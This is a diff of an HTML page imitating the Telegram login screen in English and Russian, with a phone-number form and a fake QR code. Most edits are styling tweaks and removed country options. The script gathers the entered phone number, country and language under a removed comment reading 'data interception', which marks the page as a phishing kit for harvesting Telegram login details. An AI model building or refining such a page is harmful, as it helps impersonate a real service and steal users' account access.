@@ -16,107 +16,76 @@
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
             background: linear-gradient(135deg, #1e2a3a 0%, #0d1520 100%);
-            height: 100vh;
+            min-height: 100vh;
             display: flex;
             align-items: center;
             justify-content: center;
             color: #ffffff;
-            transition: all 0.3s ease;
+            padding: 20px;
         }
 
         .auth-pages__container {
             background: #1e2a3a;
             border-radius: 12px;
-            width: 360px;
-            padding: 40px;
+            width: 100%;
+            max-width: 320px;
+            padding: 25px 20px;
             box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4);
             text-align: center;
             border: 1px solid #2a3849;
-            animation: slideUp 0.5s ease-out;
-        }
-
-        @keyframes slideUp {
-            from {
-                opacity: 0;
-                transform: translateY(20px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
         }
 
         .auth-image {
-            margin-bottom: 24px;
-            animation: fadeIn 0.8s ease-out;
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; }
-            to { opacity: 1; }
+            margin-bottom: 20px;
         }
 
         .sign-logo {
-            width: 64px;
-            height: 64px;
+            width: 50px;
+            height: 50px;
             color: #3390ec;
         }
 
         .auth-title {
-            font-size: 20px;
-            font-weight: 500;
+            font-size: 18px;
+            font-weight: 600;
             margin-bottom: 8px;
             color: #ffffff;
         }
 
         .auth-description {
-            font-size: 14px;
+            font-size: 13px;
             color: #8a9aa8;
-            margin-bottom: 24px;
+            margin-bottom: 20px;
             line-height: 1.4;
         }
 
         .input-group {
-            margin-bottom: 16px;
+            margin-bottom: 15px;
             text-align: left;
-            animation: slideIn 0.6s ease-out;
-        }
-
-        @keyframes slideIn {
-            from {
-                opacity: 0;
-                transform: translateX(-10px);
-            }
-            to {
-                opacity: 1;
-                transform: translateX(0);
-            }
         }
 
         .input-label {
             display: block;
-            font-size: 14px;
+            font-size: 13px;
             font-weight: 500;
-            margin-bottom: 8px;
+            margin-bottom: 6px;
             color: #ffffff;
         }
 
         .select-input, .text-input {
             width: 100%;
-            height: 44px;
-            padding: 0 16px;
+            height: 40px;
+            padding: 0 12px;
             border: 1px solid #3d4d61;
             border-radius: 8px;
-            font-size: 15px;
+            font-size: 14px;
             background: #2a3849;
             color: #ffffff;
-            transition: all 0.3s ease;
         }
 
         .select-input:focus, .text-input:focus {
             outline: none;
             border-color: #3390ec;
-            box-shadow: 0 0 0 2px rgba(51, 144, 236, 0.2);
         }
 
         .phone-input-group {
@@ -125,41 +94,34 @@
         }
 
         .country-code {
-            width: 80px;
+            width: 75px;
+            flex-shrink: 0;
         }
 
         .phone-number {
             flex: 1;
+            min-width: 0;
         }
 
         .btn-primary {
             width: 100%;
-            height: 44px;
+            height: 42px;
             background: #3390ec;
             color: #fff;
             border: none;
             border-radius: 8px;
-            font-size: 16px;
-            font-weight: 500;
+            font-size: 15px;
+            font-weight: 600;
             cursor: pointer;
             margin-top: 8px;
-            transition: all 0.3s ease;
-            animation: pulse 2s infinite;
-        }
-
-        @keyframes pulse {
-            0% { transform: scale(1); }
-            50% { transform: scale(1.02); }
-            100% { transform: scale(1); }
         }
 
         .btn-primary:hover {
             background: #2b85e0;
-            transform: translateY(-1px);
         }
 
         .divider {
-            margin: 24px 0;
+            margin: 20px 0;
             position: relative;
             text-align: center;
         }
@@ -177,72 +139,56 @@
         .divider-text {
             display: inline-block;
             background: #1e2a3a;
-            padding: 0 16px;
+            padding: 0 12px;
             color: #8a9aa8;
-            font-size: 14px;
+            font-size: 13px;
             position: relative;
         }
 
         .btn-secondary {
             width: 100%;
-            height: 44px;
+            height: 40px;
             background: transparent;
             color: #3390ec;
             border: 1px solid #3390ec;
             border-radius: 8px;
-            font-size: 16px;
+            font-size: 14px;
             font-weight: 500;
             cursor: pointer;
-            transition: all 0.3s ease;
         }
 
         .btn-secondary:hover {
             background: #3390ec;
             color: #fff;
-            transform: translateY(-1px);
         }
 
         .auth-footer {
-            margin-top: 24px;
-            padding-top: 16px;
+            margin-top: 20px;
+            padding-top: 15px;
             border-top: 1px solid #3d4d61;
         }
 
         .lang-link {
             color: #3390ec;
-            font-size: 14px;
+            font-size: 13px;
             text-decoration: none;
             cursor: pointer;
-            transition: all 0.3s ease;
-            position: relative;
         }
 
         .lang-link:hover {
             text-decoration: underline;
-            transform: translateX(5px);
-        }
-
-        .lang-link::after {
-            content: "→";
-            margin-left: 5px;
-            transition: transform 0.3s ease;
-        }
-
-        .lang-link:hover::after {
-            transform: translateX(3px);
         }
 
         /* QR Code Section */
         .qr-section {
             display: none;
-            animation: fadeIn 0.5s ease-out;
         }
 
         .qr-code {
-            width: 200px;
-            height: 200px;
+            width: 180px;
+            height: 180px;
             background: #ffffff;
-            margin: 20px auto;
+            margin: 15px auto;
             padding: 10px;
             border-radius: 8px;
             display: flex;
@@ -250,14 +196,14 @@
             justify-content: center;
             font-family: monospace;
             color: #000;
-            font-size: 8px;
+            font-size: 7px;
             line-height: 1;
         }
 
         .qr-instructions {
             color: #8a9aa8;
-            font-size: 14px;
-            margin-bottom: 20px;
+            font-size: 13px;
+            margin-bottom: 15px;
         }
 
         /* Русская версия */
@@ -265,13 +211,26 @@
             display: none;
         }
 
-        .fade-out {
-            animation: fadeOut 0.3s ease-out;
-        }
-
-        @keyframes fadeOut {
-            from { opacity: 1; }
-            to { opacity: 0; }
+        /* Адаптация для очень маленьких экранов */
+        @media (max-width: 340px) {
+            .auth-pages__container {
+                padding: 20px 15px;
+                max-width: 280px;
+            }
+            
+            .phone-input-group {
+                gap: 6px;
+            }
+            
+            .country-code {
+                width: 70px;
+            }
+            
+            .qr-code {
+                width: 160px;
+                height: 160px;
+                font-size: 6px;
+            }
         }
     </style>
 </head>
@@ -302,18 +261,6 @@
                                 <option value="DE" data-code="+49">Germany</option>
                                 <option value="FR" data-code="+33">France</option>
                                 <option value="GB" data-code="+44">United Kingdom</option>
-                                <option value="CN" data-code="+86">China</option>
-                                <option value="JP" data-code="+81">Japan</option>
-                                <option value="IT" data-code="+39">Italy</option>
-                                <option value="ES" data-code="+34">Spain</option>
-                                <option value="CA" data-code="+1">Canada</option>
-                                <option value="AU" data-code="+61">Australia</option>
-                                <option value="BR" data-code="+55">Brazil</option>
-                                <option value="IN" data-code="+91">India</option>
-                                <option value="KR" data-code="+82">South Korea</option>
-                                <option value="TR" data-code="+90">Turkey</option>
-                                <option value="PL" data-code="+48">Poland</option>
-                                <option value="NL" data-code="+31">Netherlands</option>
                             </select>
                         </div>
                         
@@ -328,17 +275,6 @@
                                     <option value="+49">+49</option>
                                     <option value="+33">+33</option>
                                     <option value="+44">+44</option>
-                                    <option value="+86">+86</option>
-                                    <option value="+81">+81</option>
-                                    <option value="+39">+39</option>
-                                    <option value="+34">+34</option>
-                                    <option value="+61">+61</option>
-                                    <option value="+55">+55</option>
-                                    <option value="+91">+91</option>
-                                    <option value="+82">+82</option>
-                                    <option value="+90">+90</option>
-                                    <option value="+48">+48</option>
-                                    <option value="+31">+31</option>
                                 </select>
                                 <input type="tel" class="text-input phone-number" id="phoneNumber" placeholder="Phone number">
                             </div>
@@ -369,7 +305,7 @@
                                 ██∙██████∙∙███<br>
                                 ██∙∙∙∙∙∙∙∙∙∙██<br>
                                 ██████████████<br>
-                                Telegram Login
+                                Telegram
                             </div>
                             <button class="btn-secondary" onclick="hideQRCode('en')">Back to phone login</button>
                         </div>
@@ -403,18 +339,6 @@
                                 <option value="DE" data-code="+49">Германия</option>
                                 <option value="FR" data-code="+33">Франция</option>
                                 <option value="GB" data-code="+44">Великобритания</option>
-                                <option value="CN" data-code="+86">Китай</option>
-                                <option value="JP" data-code="+81">Япония</option>
-                                <option value="IT" data-code="+39">Италия</option>
-                                <option value="ES" data-code="+34">Испания</option>
-                                <option value="CA" data-code="+1">Канада</option>
-                                <option value="AU" data-code="+61">Австралия</option>
-                                <option value="BR" data-code="+55">Бразилия</option>
-                                <option value="IN" data-code="+91">Индия</option>
-                                <option value="KR" data-code="+82">Южная Корея</option>
-                                <option value="TR" data-code="+90">Турция</option>
-                                <option value="PL" data-code="+48">Польша</option>
-                                <option value="NL" data-code="+31">Нидерланды</option>
                             </select>
                         </div>
                         
@@ -429,17 +353,6 @@
                                     <option value="+49">+49</option>
                                     <option value="+33">+33</option>
                                     <option value="+44">+44</option>
-                                    <option value="+86">+86</option>
-                                    <option value="+81">+81</option>
-                                    <option value="+39">+39</option>
-                                    <option value="+34">+34</option>
-                                    <option value="+61">+61</option>
-                                    <option value="+55">+55</option>
-                                    <option value="+91">+91</option>
-                                    <option value="+82">+82</option>
-                                    <option value="+90">+90</option>
-                                    <option value="+48">+48</option>
-                                    <option value="+31">+31</option>
                                 </select>
                                 <input type="tel" class="text-input phone-number" id="phoneNumberRu" placeholder="Номер телефона">
                             </div>
@@ -470,9 +383,9 @@
                                 ██∙██████∙∙███<br>
                                 ██∙∙∙∙∙∙∙∙∙∙██<br>
                                 ██████████████<br>
-                                Вход в Telegram
+                                Telegram
                             </div>
-                            <button class="btn-secondary" onclick="hideQRCode('ru')">Назад к входу по номеру</button>
+                            <button class="btn-secondary" onclick="hideQRCode('ru')">Назад к номеру</button>
                         </div>
                     </div>
                     
@@ -485,7 +398,6 @@
     </div>
 
     <script>
-        // Общие данные для синхронизации
         let currentCountry = 'RU';
         let currentPhone = '';
 
@@ -497,10 +409,7 @@
             const countryCode = selectedOption.getAttribute('data-code');
             currentCountry = selectedOption.value;
             
-            // Обновляем код страны
             codeSelect.value = countryCode;
-            
-            // Синхронизируем с другой версией
             syncCountrySelection(lang);
         }
 
@@ -512,7 +421,6 @@
             
             const selectedValue = sourceSelect.value;
             
-            // Находим соответствующий option в целевом select
             for (let option of targetSelect.options) {
                 if (option.value === selectedValue) {
                     targetSelect.value = selectedValue;
@@ -539,7 +447,6 @@
             
             const fullPhone = countryCode + phone;
             
-            // Перехват данных
             console.log('📱 Phone:', fullPhone);
             console.log('🌍 Country:', country);
             console.log('🌐 Language:', lang);
@@ -554,25 +461,15 @@
         }
 
         function switchToRussian() {
-            // Синхронизируем выбор страны перед переключением
             syncCountrySelection('en');
-            
-            document.querySelector('.english').classList.add('fade-out');
-            setTimeout(() => {
-                document.querySelector('.english').style.display = 'none';
-                document.querySelector('.russian').style.display = 'block';
-            }, 300);
+            document.querySelector('.english').style.display = 'none';
+            document.querySelector('.russian').style.display = 'block';
         }
 
         function switchToEnglish() {
-            // Синхронизируем выбор страны перед переключением
             syncCountrySelection('ru');
-            
-            document.querySelector('.russian').classList.add('fade-out');
-            setTimeout(() => {
-                document.querySelector('.russian').style.display = 'none';
-                document.querySelector('.english').style.display = 'block';
-            }, 300);
+            document.querySelector('.russian').style.display = 'none';
+            document.querySelector('.english').style.display = 'block';
         }
 
         function showQRCode(lang) {
@@ -597,7 +494,6 @@
             });
         }
 
-        // Инициализация при загрузке
         document.addEventListener('DOMContentLoaded', function() {
             updateCountryCode('en');
         });
